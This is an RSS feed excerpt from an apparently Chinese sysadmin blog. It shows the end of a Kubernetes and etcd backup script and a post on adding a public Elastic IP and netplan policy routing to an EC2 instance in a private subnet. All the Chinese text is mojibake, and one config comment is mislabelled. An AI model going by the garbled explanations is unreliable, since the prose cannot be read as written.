&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;          &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$FILE_PATH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;# æ£€æŸ¥ Secret æ˜¯å¦ä¸º Service Account Tokenï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å‘å‡ºè­¦å‘Š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;secrets&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; grep -q &lt;span class=&#34;s1&#34;&gt;&amp;#39;kubernetes.io/service-account.name&amp;#39;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$FILE_PATH&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;    [è­¦å‘Š] Secret &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$RESOURCE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; æ˜¯ Service Account Tokenï¼Œé€šå¸¸ä¸éœ€è¦å¤‡ä»½ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 1. è·å–æ‰€æœ‰å‘½åç©ºé—´ (Namespace)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NAMESPACES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;kubectl get ns -o &lt;span class=&#34;nv&#34;&gt;jsonpath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{.items[*].metadata.name}&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -z &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACES&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;é”™è¯¯ï¼šæœªæ‰¾åˆ°ä»»ä½•å‘½åç©ºé—´ã€‚è¯·æ£€æŸ¥ kubectl é…ç½®å’Œé›†ç¾¤è¿æ¥ã€‚&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;æ‰¾åˆ°ä»¥ä¸‹å‘½åç©ºé—´: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACES&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;----------------------------------------------------&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 2. éå†æ¯ä¸ªå‘½åç©ºé—´å’Œèµ„æºç±»å‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; NAMESPACE in &lt;span class=&#34;nv&#34;&gt;$NAMESPACES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- å¤„ç†å‘½åç©ºé—´: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; TYPE in &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;RESOURCE_TYPES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[@]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        backup_resource &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TYPE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$OUTPUT_DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--- å‘½åç©ºé—´ &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NAMESPACE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; å¤„ç†å®Œæˆ ---&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ETCDCTL_API&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; etcdctl &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--endpoints&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;https://10.10.240.3:2379 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--cacert&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/ssl/etcd/ca.pem &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--cert&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/ssl/etcd/etcd-client.pem &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--key&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/etc/ssl/etcd/etcd-client-key.pem &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;snapshot save &lt;span class=&#34;nv&#34;&gt;$OUTPUT_DIR&lt;/span&gt;/etcd-&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;date +%Y%m%d&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;-snapshot.db
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;====================================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;âœ… æ‰€æœ‰æŒ‡å®šèµ„æºå·²æˆåŠŸå¤‡ä»½åˆ°ç›®å½•: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$OUTPUT_DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;====================================================&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>AWS æ”¾é”™åœ¨Privateå­ç½‘çš„æœºå™¨å¦‚ä½•ç”¨å…¬ç½‘IPè¿è¿›å»</title>
      <link>https://rendoumi.com/posts/20251116-aws_private_public_ip/</link>
      <pubDate>Sun, 16 Nov 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251116-aws_private_public_ip/</guid>
      <description>&lt;p&gt;ä»Šå¤©é¢è¯•äº†ä¸€ä¸‹ï¼Œé¢è¯•å®˜é—®åˆ°AWSçš„å­ç½‘é—®é¢˜ï¼Œæ¥è¯´è¯´AWSçš„æœ€ä½³å®è·µï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯VPCçš„åˆ’å®šï¼Œç„¶åå°±æ˜¯ä¸‰ä¸ªpublicå­ç½‘ï¼Œä¸‰ä¸ªprivateå­ç½‘ï¼Œéƒ½æ˜¯ä¸€ä¸ªzoneåˆ†å¸ƒåœ¨aã€bã€cä¸‰ä¸ªä¸åŒæœºæˆ¿&lt;/p&gt;
&lt;p&gt;æ¥ä¿è¯æœ€å¤§å†—ä½™æ€§ï¼Œç„¶åpubå­ç½‘é€šè¿‡IGWæ¥å‡ºå…¬ç½‘ï¼Œé‚£Privateå­ç½‘å°±é€šè¿‡NATå‡ºå…¬ç½‘ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œä½†æ˜¯ï¼Œä½†æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ æŠŠä¸€å°EC2æœåŠ¡å™¨ä¸€å¼€å§‹å°±æ”¾é”™äº†å­ç½‘ï¼Œæ”¾åˆ°äº†privateå­ç½‘é‡Œï¼Œç„¶åä¸Šé¢åˆè·‘äº†é‡è¦çš„æœåŠ¡ï¼Œæ— æ³•è¿ç§»ï¼Œæ— æ³•é‡å¯ï¼Œè€Œä¸”æ•´ä¸ªvpcé‡Œåªæœ‰è¿™ä¸€å°ec2ï¼Œå…¶å®ƒä¸œè¥¿éƒ½æ˜¯awsçš„æœåŠ¡æˆ–è€…å¸‚åœºçš„æœåŠ¡åˆæˆ–è€…fargateã€lambdaä¹‹ç±»çš„æ— æœåŠ¡å™¨ï¼Œè¿™æ—¶å€™ä½ æƒ³è¿›å»è°ƒè¯•ï¼Œé‚£å°±éº»çƒ¦å¤§äº†&lt;/p&gt;
&lt;p&gt;é‚£èƒ½ä¸èƒ½ç»™è¿™å°privateçš„æœºå™¨åŠ ä¸Šå…¬ç½‘ipæ¥å½“ä½œè·³æ¿æœºç›´æ¥è®¿é—®å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå¯ä»¥ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åˆæ¥äº†ï¼Œå¦‚æœè¿™ä¹ˆé…ç½®äº†ï¼Œä½ è¦å¯¹è·¯ç”±éå¸¸çš„ç†Ÿæ‚‰ï¼Œå› ä¸ºéšåå‘ç”Ÿé”™ä¹±çš„æƒ…å†µå¯èƒ½éœ€è¦ä½ æ‰‹åŠ¨æ·»åŠ è·¯ç”±ï¼Œæœ€éº»çƒ¦çš„ä¸æ˜¯é…ç½®ç½‘å¡ï¼Œè€Œæ˜¯é…ç½®è·¯ç”±ï¼&lt;/p&gt;
&lt;p&gt;åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€åŠ¨æ€æ·»åŠ å¼¹æ€§ipåˆ°è¿™ä¸ªec2çš„ç¬¬äºŒä¸ªç½‘å¡&lt;/p&gt;
&lt;p&gt;äºŒã€é…ç½®ç½‘ç»œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/netplan/50-cloud-init.yaml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# This file is generated from information provided by the datasource.  Changes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# to it will not persist across an instance reboot.  To disable cloud-init&amp;#39;s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# network configuration capabilities, write a file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# network: {config: disabled}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ethernets:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        enX0:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            addresses:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              - 10.0.132.169/20 &lt;span class=&#34;c1&#34;&gt;#The private IP address of primary ENI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            nameservers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              addresses:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                - 10.0.0.2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            routes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - to: 0.0.0.0/0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               via: 10.0.128.1 &lt;span class=&#34;c1&#34;&gt;# Default gateway, you can find it using** ip r** command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - to: 10.0.132.169
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               via: 0.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               scope: link
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            routing-policy:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - from: 10.0.132.169
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            dhcp4: no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            dhcp6: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            match:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                macaddress: 06:36:82:ef:39:39
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            set-name: enX0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        enX1:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            addresses:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              - 10.0.3.176/20 &lt;span class=&#34;c1&#34;&gt;#The private IP address of primary ENI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            gateway4: 10.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            nameservers:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              addresses:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                - 8.8.8.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                - 1.1.1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            routes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - to: 0.0.0.0/0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               via: 10.0.0.1 &lt;span class=&#34;c1&#34;&gt;# Default gateway, you can find it using** ip r** command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - to: 10.0.3.176
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               via: 0.0.0.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               scope: link
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            routing-policy:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - from: 10.0.3.176
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             - from: 120.116.111.99
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               table: &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            dhcp4: no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            dhcp6: &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            match:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                macaddress: 06:29:c3:b2:c5:f9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            set-name: enX1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    version: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netplan apply
